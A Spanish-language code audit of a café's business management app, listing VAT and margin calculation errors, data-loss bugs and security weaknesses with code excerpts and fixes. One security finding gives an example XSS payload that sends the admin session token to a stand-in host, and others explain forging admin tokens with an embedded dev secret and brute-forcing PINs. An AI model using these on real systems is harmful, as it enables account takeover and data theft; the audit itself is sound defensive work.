# Auditoría al milímetro · Control M (m de materia) — octubre 2026

> **Para quien lee esto (humano o IA):** este documento es **autocontenido**. Describe un software real (un Business Operating System de hostelería) y lista, con evidencia (archivo:línea + fragmento de código), todo lo que se puede mejorar. No necesitas acceso al repositorio para analizarlo. Objetivo: que puedas proponer mejoras, detectar riesgos y priorizar.

**Resumen:** 79 hallazgos · 🔴 7 críticos · 🟠 22 altos · 🟡 30 medios · ⚪ 20 bajos. Auditoría hecha por 9 revisores en paralelo sobre el código actual; cada hallazgo cita su ubicación exacta.

---

## Qué es Control M (arquitectura, para contexto)

- **Negocio:** café de especialidad y matcha en El Palo / Pedregalejo (Málaga). App en español, PWA, móvil primero. La dueña (Mónica) es autónoma.
- **Backend:** Node/Express (carpeta `backend/`). Persistencia en `data-store.js`: **JSON en disco** o **PostgreSQL** si hay `DATABASE_URL` (capa `db.js`). Entidades: ventas, productos, materias, recetas, fixed_costs, docs_agora, etc.
- **Motor de dinero:** `costing.js` (coste de producto por escandallo, NETO), `financials.js` (P&L: beneficio, food cost, margen), `periods.js`+`tz.js` (rangos y zona horaria Europe/Madrid), `cuenta-resultados.js`, `financiero.js`, `cierre-mes.js`, `dashboard-ceo.js`, `executive-dashboard.js`, `break-even.js`, `fixed-costs.js`, `staff-finance.js`, `economia-guard.js`.
- **Integración TPV Ágora:** un **conector** (`conector-agora/`, Node) corre en el PC del local, lee la API de Ágora (localhost:8984, documentos Invoices/DeliveryNotes/SalesOrders) y los envía a Control M, que los procesa en `agora.js` (`importarDocs`) vía `tpv-connector.js`. Conciliación en `conciliacion-ventas.js`.
- **PWA / avisos:** `frontend/sw.js` (service worker), `manifest.webmanifest`, `push.js` (web-push VAPID), `sv-timers.js` (temporizadores sous-vide con aviso push), `routes/avisos.js`.
- **Frontend:** SPA de **un solo fichero** `frontend/index.html` (~14.000 líneas, JS vanilla). Helper `esc()` para escapar HTML. `mbdsEsAdmin()` decide si se muestran cifras de dinero. Rail lateral en escritorio (≥1281px), barra inferior en móvil.
- **Roles:** `admin` (dirección) y `equipo`. **Regla innegociable:** el `equipo` NUNCA ve coste, precio de coste ni margen. Autenticación por PIN de 4 dígitos + JWT.
- **Tests:** `tests/*.unit.js` (unitarios) + `tests/e2e.spec.js` (Playwright). Arranque: `CI=true npm test`. El servidor en Render corre en **UTC**.

---

## Ya corregido en la sesión de trabajo en curso (contexto, no re-reportar)

Estos puntos ya se arreglaron y desplegaron; se listan para que el análisis no los marque como abiertos:

1. **Fuga de dinero al rol equipo:** middleware global `economia-guard.filtrarRespuestas` que elimina coste/precio/margen de toda respuesta `/api` para no-admin; `materias.js` impide al equipo escribir precios de compra. Tests que lo blindan.
2. **IVA del P&L:** el beneficio, food cost y margen se calculan sobre **ventas netas** (sin IVA); el titular "ventas" sigue en **bruto** (cuadra con Ágora). `ventasNetasEnRango`/`netoDeVenta` en `financials.js`; `cuenta-resultados.js` igual.
3. **Previsión del día** en hora de Madrid (`tz.horaDecimal`), ya no UTC. **Nº de tickets / ticket medio** del cierre de mes corregidos. **"Resultado del día"** = neto − materia − personal − variables − **fijos** (antes bruto y sin fijos).
4. **Análisis diario** usa la base común (neto) y cuenta TODAS las ventas del día. **Etiquetas "con IVA / sin IVA"** en las 4 pantallas financieras.
5. **Ingesta Ágora:** los **pedidos (SalesOrder)** ya no se cuentan como venta; las **devoluciones** (cantidad negativa) ahora **restan** (antes se descartaban).

> **Nota importante:** la auditoría encontró que el arreglo del IVA quedó **a medias** — ver dimensión 1: los **costes fijos** aún se restan **con IVA** de ventas **sin IVA**, y hay **tres motores de food cost** divergentes. Es el hallazgo más relevante de esta tanda.

---

## Hoja de ruta sugerida (críticos y altos primero)

| # | Sev | Hallazgo | Dónde | Esfuerzo |
|---|---|---|---|---|
| 1 | 🔴 | Secreto JWT de desarrollo embebido en el código con arranque fail-open (forjar tokens de admin) | `backend/auth.js:28-45,` | S |
| 2 | 🔴 | Colisión de ids en stock_movements al insertar por lote: el libro de stock pierde filas en cada sync de Ágora | `backend/data-store.js:254-258` | S |
| 3 | 🔴 | Mismo bug de colisión en la conciliación de duplicados y en el inventario físico | `backend/conciliacion-ventas.js:248` | S |
| 4 | 🔴 | La limpieza de duplicados por firma colapsa a 1 y BORRA ventas reales si hay dos tickets idénticos cruzando tipos | `backend/conciliacion-ventas.js:211-217` | M |
| 5 | 🔴 | El botón primario es casi ilegible en móvil (texto #23281E sobre --olive #45443D ≈ 1.5:1) | `frontend/index.html:1561-1564` | S |
| 6 | 🔴 | Cada sincronización de Ágora reescribe TODA la tabla de ventas (DELETE + re-INSERT de todo el histórico) | `backend/agora.js:314-316` | M |
| 7 | 🔴 | /api/dashboard recalcula ~30-40 pasadas completas sobre ventas por llamada, sin caché, y el front repolla cada 3 min | `backend/dashboard-ceo.js:204-237` | M |
| 8 | 🟠 | El P&L resta costes fijos CON IVA de ventas SIN IVA (asimetría de IVA) | `backend/financials.js:143-147` | M |
| 9 | 🟠 | Break-even y '¿cubrió el equilibrio?' sin convención de IVA única (neto vs bruto) | `backend/break-even.js:76-79,113-118` | M |
| 10 | 🟠 | Tres motores de food cost / margen divergentes (fuente única del margen rota) | `backend/costing.js:90-96` | L |
| 11 | 🟠 | Margen en euros por producto inflado por IVA; el micro del cierre (bruto) no cuadra con el P&L (neto) | `backend/costing.js:93,103` | M |
| 12 | 🟠 | El reloj de fichaje es un oráculo de PIN sin bloqueo: fuerza bruta de admin desde una sesión 'equipo' | `backend/routes/fichaje.js:45-51` | M |
| 13 | 🟠 | XSS almacenado por esc() inconsistente en sinks innerHTML, sin CSP que lo contenga | `frontend/index.html:8655-8676` | M |
| 14 | 🟠 | En modo Postgres las rutas responden 200 aunque la escritura encolada falle | `backend/data-store.js:150-159` | M |
| 15 | 🟠 | Escritura JSON no atómica + catch que devuelve [] ante JSON inválido = pérdida total de una entidad | `backend/data-store.js:102-108` | S |
| 16 | 🟠 | writeAll reescribe la tabla ENTERA (DELETE + re-INSERT) en cada sync de Ágora; 'ventas' crece sin límite | `backend/data-store.js:173-177` | M |
| 17 | 🟠 | Sin handler SIGTERM/beforeExit: en el redeploy de Render se pierden las escrituras encoladas | `backend/server.js` | S |
| 18 | 🟠 | Doble descuento de IVA al importar el cierre de Ágora (CSV): ingresos del mes ~9% bajos | `backend/routes/analisis-mes.js:34` | S |
| 19 | 🟠 | El doble conteo albarán+factura sigue abierto en la ingesta (bizKey no cruza números distintos) | `backend/agora.js:214-217` | M |
| 20 | 🟠 | Vía heredada importarVentas sin idempotencia sigue viva (fallback manual + cron horario + email CSV plano) | `backend/agora.js:84-95` | S |
| 21 | 🟠 | Flujos diarios no operables por teclado ni lector de pantalla (div/span onclick sin role/tabindex) | `frontend/index.html:7016` | M |
| 22 | 🟠 | Sin manejo de red offline: el usuario ve "Failed to fetch" crudo en inglés | `frontend/index.html:2571` | M |
| 23 | 🟠 | El aviso 'retira' se pierde en silencio si el server duerme/reinicia en la ventana del temporizador | `backend/sv-timers.js:60-65` | M |
| 24 | 🟠 | El push sale con TTL por defecto de 4 semanas y urgencia normal: el 'retira' puede llegar caduco | `backend/push.js:80` | S |
| 25 | 🟠 | Toda la base de datos se carga entera en memoria al arrancar; nunca se consulta por fecha en SQL | `backend/data-store.js:122-134` | L |
| 26 | 🟠 | index.html de ~950KB sin compresión (no hay middleware compression), con no-store y service worker que no cachea | `backend/server.js:407-409` | S |
| 27 | 🟠 | Escrituras que confirman exito sin haberse guardado (modo PostgreSQL) | `backend/data-store.js:150-166,` | M |
| 28 | 🟠 | Sin red de seguridad a nivel de proceso: un throw async no capturado tumba el servidor | `backend/server.js` | M |
| 29 | 🟠 | Reset de datos de test solo ANTES del e2e, nunca despues, y dependiente de disciplina manual | `package.json:10` | S |

---

## Hallazgos en detalle

## 1 · Dinero y reglas de negocio (fuente única, IVA, food cost)

**Cómo funciona hoy:** El coste de materia tiene una sola fuente real: costing.js (costeProducto/costeEscandallo, con coste_medio NETO = base imponible del albarán, confirmado en routes/recepciones.js:460 y albaran-intake.js que descarta las líneas de 'IVA/base imponible/total'). El P&L vive en financials.beneficio(): titular 'ventas' en BRUTO, pero beneficio/food cost/margen sobre ventas NETAS (netoDeVenta = importe_neto o importe/1,10) menos coste de materia NETO, personal, variables y fijos. cuenta-resultados.js, financiero.js, cierre-mes.js, dashboard-ceo.js, executive-dashboard.js y break-even.js NO recalculan: componen financials/costing. La carta usa costing.margenProducto, que presenta el coste 'CON IVA' (costeNeto×(1+iva)) y calcula margen/food cost contra el PVP bruto. En el frontend conviven motores de margen propios por familia: cocina/LAB (LAB_IVA_FOOD, coste/pvpNeto), burbujas/MBDS (mbds-engine.js, costeNeto/pvp) y spritz. Los costes fijos se suman por fixed-costs.js usando amount TAL CUAL (con IVA), y el beneficio_neto_estimado resta un 30% fijo de la cuota de préstamos como 'intereses'.

**Salud:** El arreglo del IVA de ventas es sólido y el food cost por producto reconcilia con el P&L MIENTRAS todo el IVA sea 10% uniforme; pero el tratamiento del IVA quedó a medias: el P&L resta costes fijos CON IVA de ventas SIN IVA, el break-even mezcla convenciones de IVA, y el margen en euros por producto (carta y cierre de mes) está inflado ~10% y no cuadra con el P&L ni con el análisis diario. La 'fuente única' se cumple para el COSTE, pero no para el MARGEN/FOOD COST: hay 3 motores divergentes en el front y 4 constantes de IVA duplicadas. Nada de esto rompe CI (los datos de prueba están reseteados y todo a 10%), pero distorsiona EBITDA, break-even y la rentabilidad por producto en cuanto entran datos reales.

### dinero.1 · El P&L resta costes fijos CON IVA de ventas SIN IVA (asimetría de IVA)

**🟠 ALTO** · estado: parcial (arreglado a medias) · esfuerzo: M · confianza: alta

*Área:* P&L / EBITDA

*Ubicación:* `backend/financials.js:143-147 · backend/fixed-costs.js:35 · backend/seed-negocio.js:15`

```js
const base = ventasNetas;
const operativo = eur(base - costeMateria - laboral - variables - fijos); // fijos = eur(seg.otros)  → fixed-costs.js:35 const amount = Number(fc.amount) || 0;  (nunca usa fc.vat)
```

**Problema:** Tras pasar las ventas y la materia a NETO, los costes fijos siguen entrando en BRUTO. fixed-costs.js suma 'amount' tal cual y nunca lee el campo 'vat' (que sí existe en cada fijo), y el seed guarda el alquiler como amount:665.50 (=550×1,21). En financials.beneficio la base es ventasNetas pero 'fijos' es seg.otros (con IVA).

**Impacto:** Para un negocio con IVA el coste económico real de un fijo es el NETO (el IVA soportado se recupera). Restar el bruto mete coste fantasma: solo el alquiler añade ~115,50 €/mes (el 21%) que no es coste, ~1.386 €/año. Infravalora el EBITDA, infla gastos_fijos_% y sube el break-even. Se propaga a cuenta-resultados, financiero, dashboard-ceo y break-even porque todos componen esta misma cifra.

**Recomendación:** Netear los fijos por su 'vat' en una única función (p. ej. costeDiario = (amount / (1 + vat/100)) / dias) y dejar fixed-costs como fuente del fijo NETO; o, si se quiere ver caja, llevar TODO en bruto de forma coherente. Hoy mezcla las dos bases.

### dinero.2 · Break-even y '¿cubrió el equilibrio?' sin convención de IVA única (neto vs bruto)

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Punto de equilibrio

*Ubicación:* `backend/break-even.js:76-79,113-118 · backend/analisis-diario.js:219-227`

```js
const ingresoDia = ratio ? fijoDia / ratio : null;  // break-even.js:79
const ventaMediaDia = ventasMes / diasMes;          // ventasMes = financials.ventasEnRango(rMes)  (BRUTO)
// analisis-diario.js:227  cubierto: hoy.total >= objetivo  (hoy.total BRUTO vs ingreso_equilibrio NETO)
```

**Problema:** El ratio de contribución (margenMedioCarta) es un margen NETO (el factor IVA se cancela), pero se divide por él un fijoDia que viene en BRUTO (hallazgo anterior) y el resultado se compara contra ventas en BRUTO (ventasEnRango = Σ importe con IVA; en el día hoy.total con IVA). No hay una sola base. La calculadora de objetivo del front SÍ convierte a bruto (×(1+iva)), demostrando que la convención no es única.

**Impacto:** El veredicto diario 'cubierto / en pérdidas' y el margen de seguridad se calculan sobre bases mezcladas: el umbral de equilibrio es parcialmente neto y se compara con venta bruta, así que un día puede marcarse 'por encima del equilibrio' antes de cubrirlo de verdad (del lado del margen, ~9% optimista). Es la métrica que más mira un hostelero para decidir si abrir compensa.

**Recomendación:** Elegir UNA base (recomendado: todo NETO) y aplicarla a fijos, ratio de contribución y venta comparada; o expresar el equilibrio en bruto multiplicando por (1+IVA) como ya hace ccObjetivo (index.html:8024). Unificar break-even.js y ccObjetivo en una sola función.

### dinero.3 · Tres motores de food cost / margen divergentes (fuente única del margen rota)

**🟠 ALTO** · estado: abierto · esfuerzo: L · confianza: alta

*Área:* Food cost / margen de carta

*Ubicación:* `backend/costing.js:90-96 · frontend/index.html:5527 · backend/mbds-engine.js:135-138`

```js
costing.js:93  const coste = ...costeNeto * (1 + iva)...; foodCost = coste / precio
index.html:5527  const pvpNeto = p.pvp/(1+LAB_IVA_FOOD), fc = coste/pvpNeto*100
mbds-engine.js:137  const foodCost = round((costeServicio / pvp) * 100, 1)
```

**Problema:** Conviven tres fórmulas distintas para lo mismo. Backend carta: coste×(1+iva)/pvp_bruto. Front cocina/LAB: coste_neto/pvpNeto (pvp÷1,10). Front burbujas/MBDS: coste_neto/pvp_bruto SIN ajustar IVA. Para coste 1,00 € y PVP 4,50 €: carta y LAB dan 24,4% de food cost, pero MBDS da 22,2% y recomienda PVP = coste/0,22 (~10% bajo).

**Impacto:** Los Spritz y las burbujas (producto estrella de la marca) muestran un food cost ~2 puntos más bajo del real y un margen inflado, y el 'PVP recomendado' sale ~10% barato → se fija mal el precio de las bebidas de autor. El mismo sándwich puede mostrar distinto food cost/margen según se mire en LAB o en la Carta.

**Recomendación:** Exponer el margen de carta por API (/api/carta ya es fuente única para las latas FIT) y que LAB, MBDS y Spritz consuman ESE cálculo en vez de reimplementarlo; unificar en costing.margenProducto con una sola convención neta.

### dinero.4 · Margen en euros por producto inflado por IVA; el micro del cierre (bruto) no cuadra con el P&L (neto)

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Rentabilidad por producto

*Ubicación:* `backend/costing.js:93,103 · backend/cierre-mes.js:59,72,227-229 · backend/analisis-diario.js:83-84`

```js
costing.js:103  margen_euros: Math.round((precio - coste) * 100) / 100  // coste con IVA
cierre-mes.js:59,72  const importe = Number(v.importe) (BRUTO); const costeUnit = margenProducto(p).coste (CON IVA)
analisis-diario.js:83  beneficio: x.coste_conocido ? eur(x.neto - x.coste) : null  // NETO
```

**Problema:** margenProducto.margen_euros = precio_bruto − coste×(1+iva) = 1,10×(margen neto). El cierre de mes (micro por producto) usa ingreso en BRUTO (v.importe) y coste CON IVA, mientras el análisis diario usa el mismo producto en NETO (x.neto − x.coste). El beneficio por producto difiere entre pantallas y no suma al margen bruto del macro (que es neto).

**Impacto:** El beneficio por producto del cierre y de la carta aparece ~10% más alto que el real, y la suma de 'beneficio por producto' del cierre no reconcilia con el margen bruto del P&L. La fundadora, que revisa el cierre 'a nivel psicópata', verá cifras por producto que no atan con el EBITDA.

**Recomendación:** Llevar el micro del cierre a base NETA (usar netoDeVenta para el ingreso y costeProducto NETO para el coste), igual que analisis-diario, o exponer margen_neto explícito en margenProducto y usarlo en todas las vistas de beneficio por producto.

### dinero.5 · 'coste con IVA' usa el IVA de VENTA (no el de compra) y solo cuadra con IVA uniforme al 10%

**🟡 MEDIO** · estado: parcial (arreglado a medias) · esfuerzo: M · confianza: alta

*Área:* IVA / food cost

*Ubicación:* `backend/costing.js:82-93`

```js
const iva = ivaDe(producto); // IVA de VENTA
const coste = Math.round(costeNeto * (1 + iva) * 10000) / 10000; // 'coste CON IVA'
```

**Problema:** ivaDe() devuelve el IVA de venta del producto (10% por defecto) y margenProducto lo usa para 'engordar' el coste ('neto + IVA de compra'), pero el IVA de compra de la materia no es el de venta (pan/leche 4%, alcohol 21%). El food cost solo cuadra con el P&L neto porque el factor (1+iva) se cancela contra el PVP bruto: eso exige que PVP e importe de venta lleven exactamente ese mismo IVA.

**Impacto:** Hoy todos los productos están sin campo iva (default 10%) y cuadra; pero el Spritz lleva Chardonnay con +21% (ya anotado en SPRITZ_DATA) y cualquier producto a 4%/21% romperá la equivalencia: el food cost y el margen de ese producto divergirán del P&L. Es una bomba de relojería en cuanto se toque un IVA.

**Recomendación:** Calcular food cost y margen SIEMPRE en neto/neto (coste_neto / (PVP/(1+iva_venta))) y dejar de 'engordar' el coste con un IVA que no es el de compra. Si se quiere mostrar 'lo que pagas al comprar', usar el IVA de compra real de cada materia, no el de venta del plato.

### dinero.6 · beneficio_neto_estimado con interés fijo al 30% de la cuota, ignorando el interés real ya disponible

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Beneficio neto

*Ubicación:* `backend/financials.js:150-153 · backend/debts.js:59-64`

```js
const interesesPeriodo = eur(cuotaMensual * (dias / (365 / 12)) * 0.3); // ~30% de la cuota como interés estimado
```

**Problema:** Se imputa como interés del periodo el 30% de la cuota mensual, un número mágico. debts.js ya calcula un interés mejor por préstamo (interesesEstimados = cuota×cuotas_restantes − pendiente) que financials no usa, aun importando debtsMod.

**Impacto:** El beneficio_neto_estimado (visible en el cierre de mes) usa un reparto arbitrario: al inicio de un préstamo el interés es mucho más del 30% de la cuota y al final casi 0%. Hoy no afecta (sin deuda cargada), pero en cuanto se registre un préstamo la cifra 'neto' será incorrecta de forma sistemática.

**Recomendación:** Derivar el interés del periodo de debts.resumen().intereses_estimados prorrateado por cuotas_restantes (o del tipo real si se añade), en lugar del 0,3 fijo. Esfuerzo bajo: el dato ya existe en el módulo que financials importa.

### dinero.7 · 'Margen medio' y 'food cost medio' de la carta son medias NO ponderadas por ventas

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Food cost carta vs P&L

*Ubicación:* `backend/costing.js:119-134`

```js
const suma = items.reduce((s, x) => s + x.mm.margen_bruto, 0);
return Math.round((suma / items.length) * 1000) / 1000;
```

**Problema:** margenMedioCarta y foodCostMedioCarta promedian cada producto con el mismo peso, sin tener en cuenta cuánto se vende. El food cost del P&L es ponderado por la mezcla real de ventas. Son dos métricas distintas presentadas como comparables.

**Impacto:** El titular 'Margen medio de la carta' de la portada (y la contribución del break-even) puede ser optimista si los más vendidos son los de peor margen: nunca cuadrará con el food cost del P&L del mes, y puede dar una falsa sensación de salud de carta.

**Recomendación:** Ponderar la media por unidades vendidas del periodo (o etiquetar explícitamente 'media de catálogo, no de ventas') para que no se confunda con el food cost real del P&L.

### dinero.8 · Constante de IVA 0,10 duplicada en 4+ módulos en vez de una fuente única

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Fuente única / IVA

*Ubicación:* `backend/costing.js:81 · backend/financials.js:35 · backend/cuenta-resultados.js:132 · backend/analisis-mes.js:17 · frontend/index.html:5304`

```js
costing.js:81 const IVA_DEF = 0.10;
financials.js:35 const IVA_VENTA_DEF = 0.10;
cuenta-resultados.js:132 const IVA_VENTA = 0.10; // hostelería
analisis-mes.js:17 const IVA_HOSTELERIA = 0.10;
```

**Problema:** El IVA de hostelería está hardcodeado por separado en costing (IVA_DEF), financials (IVA_VENTA_DEF), cuenta-resultados (IVA_VENTA), analisis-mes (IVA_HOSTELERIA) y el front (LAB_IVA_FOOD). costing ya exporta IVA_DEF pero nadie lo reutiliza.

**Impacto:** Contradice 'una sola fuente de verdad para el dinero': cualquier cambio de IVA (reforma fiscal, o soportar 4%/21%) obliga a tocar 5 sitios y es fácil que uno quede desincronizado. Deuda técnica con riesgo de divergencia silenciosa.

**Recomendación:** Importar costing.IVA_DEF (o un nuevo config/iva.js) en todos los módulos y en el front vía API, y permitir IVA por producto/categoría en un único punto.

### dinero.9 · food_cost_pct redondeado a entero en la cuenta de resultados vs 1 decimal en Financiero

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Consistencia de presentación

*Ubicación:* `backend/cuenta-resultados.js:49 · backend/financiero.js:17,68`

```js
food_cost_pct: food_cost_pct != null ? Math.round(food_cost_pct * 100) : null,
```

**Problema:** componer() redondea food_cost_pct a entero (×100 sobre la fracción), mientras financiero.ratiosDe lo da con 1 decimal (pctDe). Mismo valor, distinta precisión según pantalla.

**Impacto:** Un food cost de 24,4% aparece como 24% en una pantalla y 24,4% en otra; menor, pero genera dudas de 'por qué no coincide' en una herramienta cuyo valor es la confianza en las cifras.

**Recomendación:** Unificar el redondeo de ratios (1 decimal) en un helper compartido entre cuenta-resultados y financiero.

### dinero.10 · Valor de stock calculado inline (duplica costing.valorStock)

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: media

*Área:* Fuente única / valoración

*Ubicación:* `backend/routes/inicio.js:140 · backend/routes/materias.js:54 · backend/costing.js:137-139`

```js
inicio.js:140  valor_stock_actual: Math.round(m.disponibilidad_actual * m.coste_medio * 100) / 100,
materias.js:54  valor_stock_actual: Math.round((Number(m.disponibilidad_actual)||0) * (Number(m.coste_medio)||0) * 100) / 100,
```

**Problema:** El valor de stock (disponibilidad × coste_medio) se recalcula a mano en dos rutas en lugar de usar costing.valorStock, que es la fuente declarada.

**Impacto:** Duplicación menor de una fórmula de dinero: si cambia el criterio de valoración (p. ej. coste medio ponderado o descuento de mermas) estas dos vistas quedarían desincronizadas del resto.

**Recomendación:** Sustituir los cálculos inline por costing.valorStock / un helper por materia, para que la valoración sea un solo punto.

---

## 2 · Seguridad, autenticación y autorización

**Cómo funciona hoy:** Control M autentica con JWT (12h) firmado en backend/auth.js: las cuentas viven en la BD, el PIN de 4 dígitos se guarda hasheado (scrypt+sal) y se compara en tiempo constante. El login (routes/auth.js) tiene bloqueo por cuenta tras 5 fallos durante 15 min. El token se guarda en localStorage del navegador y viaja en cabecera Authorization: Bearer (no en cookie). La autorización por rol vive en el middleware auth.requerido: admin ve todo; el rol 'equipo' solo alcanza los segmentos de EQUIPO_ALLOWED, y un middleware global economia-guard.filtrarRespuestas limpia campos de coste/precio/margen de TODA respuesta /api para no-admin (defensa en profundidad de la regla nº2). Hay varios webhooks públicos (fuera de /api) autenticados por token compartido: /tpv/ingest y /agora/ingest (X-Connector-Token, comparación constante), /facturas/ingesta (X-Ingesta-Token) y /avisos/cron (X-Cron-Token). El servidor Express no monta helmet, CSP, HSTS ni rate limiting, tiene CORS totalmente abierto y un límite de cuerpo de 25MB que se parsea antes de autenticar. El frontend es un único index.html que escapa con esc(), pero no de forma uniforme en todos los sinks innerHTML.

**Salud:** Débil para un sistema que custodia el dinero del negocio: la base (PIN hasheado, bloqueo en login, guard económico, token constante en TPV) está bien, pero hay tres vías reales de que el rol 'equipo' o un atacante escale a admin y vea/manipule el dinero (secreto JWT de desarrollo embebido con fail-open, reloj de fichaje como oráculo de PIN sin bloqueo, y XSS almacenado sin CSP), más ausencia total de cabeceras de seguridad y rate limiting. Ninguno requiere conocimientos avanzados para explotarse.

### seguridad.1 · Secreto JWT de desarrollo embebido en el código con arranque fail-open (forjar tokens de admin)

**🔴 CRÍTICO** · estado: abierto · esfuerzo: S · confianza: media

*Área:* Autenticación

*Ubicación:* `backend/auth.js:28-45, 31`

```js
} else {
    SECRET = "control-m-secret-dev-solo-local";
    console.warn("⚠️  JWT_SECRET no definido: usando clave de desarrollo (solo local).");
  }
```

**Problema:** Si NODE_ENV no es exactamente 'production', SECRET cae a la cadena pública embebida 'control-m-secret-dev-solo-local'. En producción sin JWT_SECRET no se aborta salvo que se ponga REQUIRE_JWT_SECRET=1 (por defecto desactivado): solo se genera un secreto aleatorio y se sigue. Render arranca el proceso; si NODE_ENV no se fija a 'production' (olvido o valor distinto como 'prod'), el despliegue vivo queda firmando y verificando con un secreto que está en el repositorio.

**Impacto:** Cualquiera que lea este código (es público para quien tenga acceso al repo) puede firmar un JWT {rol:'admin'} con el secreto conocido y entrar como dirección: ve coste, precio de compra, márgenes, P&L, tesorería y puede editar precios. Rompe de raíz la regla innegociable nº2 y expone todo el dinero del café.

**Recomendación:** Fail-closed: exigir SIEMPRE JWT_SECRET definido (abortar el arranque si falta, no solo con REQUIRE_JWT_SECRET=1) y NUNCA embeber un secreto usable en el código; en local derivarlo por máquina (p. ej. de un fichero .env ignorado) o exigirlo también. Asegurar NODE_ENV=production en Render y documentarlo.

### seguridad.2 · El reloj de fichaje es un oráculo de PIN sin bloqueo: fuerza bruta de admin desde una sesión 'equipo'

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Autorización / Escalada de privilegios

*Ubicación:* `backend/routes/fichaje.js:45-51 (y backend/auth.js:138-143)`

```js
const persona = auth.verificarPin(usuario, pin);
  if (!persona) return res.status(422).json({ error: "PIN incorrecto. Inténtalo de nuevo." });
```

**Problema:** POST /api/fichaje/fichar llama a auth.verificarPin(usuario, pin), que verifica el PIN de CUALQUIER persona (incluida una cuenta admin) SIN tocar intentos_fallidos ni bloqueado_hasta. Responde 422 con PIN incorrecto y 201 al acertar: es un oráculo binario. El segmento 'fichaje' está en EQUIPO_ALLOWED, así que basta una sesión de equipo (o la tablet del local, que suele quedarse logueada) para probar sin límite.

**Impacto:** Un empleado con rol 'equipo' (o quien tenga la tablet) puede recorrer las 10.000 combinaciones de 4 dígitos contra el PIN de Mónica/Jon sin que el bloqueo de 15 min del login lo detenga, obtener el PIN de admin, iniciar sesión como dirección y ver/editar todo el dinero. El bloqueo del login queda anulado en la práctica por esta vía.

**Recomendación:** Aplicar en verificarPin el mismo contador y bloqueo por intentos que login (o un rate-limit por persona/dispositivo en /fichar), responder sin distinguir motivo y auditar los fallos. Idealmente separar el PIN de fichaje del PIN de acceso al sistema.

### seguridad.3 · XSS almacenado por esc() inconsistente en sinks innerHTML, sin CSP que lo contenga

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* XSS / Escalada de privilegios

*Ubicación:* `frontend/index.html:8655-8676 (def), 8716 (llamada), 8605/8621/8622 (wizard); backend/routes/materias.js:122-149`

```js
<div class="ficha-name">${nombre}</div>   // 8671, llamado con nombre:m.nombre (8716)
```

**Problema:** esc() existe (index.html:2585) pero no se aplica en todos los sinks. fichaTecnica inyecta ${nombre}, ${sub}, ${code}, ${nota} y ${f.v} directamente en innerHTML, y se la invoca con nombre:m.nombre SIN escapar (8716). El wizard de preparaciones inyecta ${p.nombre_receta} y ${paso.texto} crudos. El campo 'nombre' de materias es editable por el rol 'equipo' (está en CAMPOS, y 'materias' está en EQUIPO_ALLOWED). No hay cabecera Content-Security-Policy que limite la ejecución.

**Impacto:** Un empleado 'equipo' pone a un producto un nombre como <img src=x onerror="fetch('//evil/'+localStorage.cm_session)">; cuando la dueña abre su ficha técnica, el script corre en la sesión de admin y exfiltra su token de localStorage (no hay httpOnly ni CSP). Es una vía directa de equipo→admin y de fuga de todo el dinero. Mismo riesgo con nombres de producto/recetas que entran por el conector Ágora o por facturas.

**Recomendación:** Aplicar esc() a TODO dato dinámico en los sinks innerHTML (empezando por fichaTecnica, el wizard y las tablas de ajustes/merma), o migrar a textContent/plantillas seguras. Añadir una CSP estricta (ver hallazgo de cabeceras) como segunda barrera.

### seguridad.4 · Sin cabeceras de seguridad (helmet/CSP/HSTS/X-Frame-Options/X-Content-Type-Options)

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Hardening HTTP

*Ubicación:* `backend/server.js:1-16, 398-415`

```js
app.use(cors());
app.use(express.json({ limit: "25mb" }));
```

**Problema:** El servidor no monta helmet ni fija ninguna cabecera de seguridad; sirve el SPA estático sin Content-Security-Policy, sin HSTS, sin X-Frame-Options/frame-ancestors ni X-Content-Type-Options. No hay dependencia helmet en backend/package.json.

**Impacto:** Sin CSP, cualquier XSS (ver hallazgo anterior) se ejecuta sin freno y puede robar el token de admin. Sin X-Frame-Options la app se puede enmarcar (clickjacking sobre acciones de dirección). Sin HSTS, riesgo de degradación a HTTP. Es la red de seguridad que hoy no existe.

**Recomendación:** Añadir helmet con CSP restrictiva (default-src 'self'; limitar script-src; frame-ancestors 'none'), HSTS, X-Content-Type-Options nosniff y Referrer-Policy. Afinar la CSP al SPA de un fichero (hoy usa estilos/scripts inline, habrá que permitirlos con cuidado o extraerlos).

### seguridad.5 · Sin rate limiting y cuerpo de 25MB parseado antes de autenticar (fuerza bruta y DoS)

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Disponibilidad / Abuso

*Ubicación:* `backend/server.js:16, 325`

```js
app.use(express.json({ limit: "25mb" }));
```

**Problema:** No hay rate limiting en ninguna ruta. express.json({limit:'25mb'}) es global y corre ANTES de app.use('/api', auth.requerido) y antes de la comprobación de token de los webhooks, así que el servidor parsea hasta 25MB (12MB en /tpv/ingest) de JSON de peticiones NO autenticadas antes de devolver el 401. El login tampoco tiene límite por IP (solo bloqueo por cuenta).

**Impacto:** Un atacante puede saturar CPU/memoria del contenedor de Render enviando cuerpos grandes a /api/* o a los webhooks sin credenciales, dejando el BOS caído en servicio (cierre de caja, pedidos, fichaje). También facilita barridos de fuerza bruta de login repartidos entre cuentas sin coste.

**Recomendación:** Montar express-rate-limit (límite global y uno estricto en /api/auth/login y /fichar), reducir el límite de cuerpo por ruta (p. ej. 1MB por defecto y 25MB solo donde hay fotos/adjuntos) y validar el token del webhook antes de parsear el cuerpo grande.

### seguridad.6 · CORS totalmente abierto (Access-Control-Allow-Origin: *)

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* CORS

*Ubicación:* `backend/server.js:11`

```js
app.use(cors());
```

**Problema:** cors() sin opciones responde con Access-Control-Allow-Origin: * en todas las rutas, incluidos /api y los webhooks. El riesgo de robo de sesión está acotado porque la auth es por cabecera Bearer (no por cookie, así que no hay CSRF clásico), pero cualquier web de terceros puede invocar la API y leer respuestas públicas, y amplía la superficie si se combina con un token filtrado por XSS.

